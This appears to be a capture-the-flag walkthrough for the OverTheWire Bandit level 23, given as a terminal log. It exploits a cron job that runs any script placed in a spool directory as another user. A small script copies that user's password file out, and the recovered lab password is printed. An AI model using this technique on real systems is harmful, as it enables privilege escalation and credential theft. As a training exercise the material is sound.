## bandit23

```bash
bandit23@bandit:~$ cd /etc/cron.d
bandit23@bandit:/etc/cron.d$ ls
cronjob_bandit15_root  cronjob_bandit23       e2scrub_all
cronjob_bandit17_root  cronjob_bandit24       otw-tmp-dir
cronjob_bandit22       cronjob_bandit25_root  sysstat
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo || exit 1
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -rf ./$i
    fi
done
bandit23@bandit:/etc/cron.d$ mktemp -d
/tmp/tmp.vAoXLPrW7z
bandit23@bandit:/etc/cron.d$ cd /tmp/tmp.vAoXLPrW7z
bandit23@bandit:/tmp/tmp.vAoXLPrW7z$ nano pass.sh
		#!/bin/bash

		cat /etc/bandit_pass/bandit24 > /tmp/tmp.vAoXLPrW7z/password24
bandit23@bandit:/tmp/tmp.vAoXLPrW7z$ chmod 777 pass.sh
bandit23@bandit:/tmp/tmp.vAoXLPrW7z$ ls
pass.sh
bandit23@bandit:/tmp/tmp.vAoXLPrW7z$ cd ..
bandit23@bandit:/tmp$ chmod 777 tmp.vAoXLPrW7z
bandit23@bandit:/tmp$ cd tmp.vAoXLPrW7z
bandit23@bandit:/tmp/tmp.vAoXLPrW7z$ date
Wed Jun 14 08:41:26 AM UTC 2023
bandit23@bandit:/tmp/tmp.vAoXLPrW7z$ ls
pass.sh
bandit23@bandit:/tmp/tmp.vAoXLPrW7z$ cp pass.sh /var/spool/bandit24/foo
bandit23@bandit:/tmp/tmp.vAoXLPrW7z$ ls -al
total 1168
drwxrwxrwx  2 bandit23 bandit23    4096 Jun 14 08:43 .
drwxrwx-wt 59 root     root     1179648 Jun 14 08:49 ..
-rwxrwxrwx  1 bandit23 bandit23      77 Jun 14 08:34 pass.sh
-rw-rw-r--  1 bandit24 bandit24      33 Jun 14 08:47 password24
bandit23@bandit:/tmp/tmp.vAoXLPrW7z$ cat password24
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```